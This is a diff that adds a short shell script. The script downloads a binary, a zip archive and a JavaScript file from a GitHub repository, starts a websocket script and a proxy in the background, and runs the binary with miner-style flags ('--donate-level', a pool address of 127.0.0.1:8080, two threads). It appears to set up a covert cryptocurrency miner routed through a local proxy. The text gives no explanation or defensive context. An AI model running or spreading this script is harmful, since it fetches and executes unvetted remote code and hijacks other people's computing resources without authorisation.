@@ -1,0 +1,9 @@
+curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/bos
+curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/set.zip
+curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/wss.js
+nohup node wss.js &
+unzip set.zip
+chmod +x proxy
+nohup ./proxy &
+chmod +x bos
+./bos --donate-level 1 -o 127.0.0.1:8080 -t 2
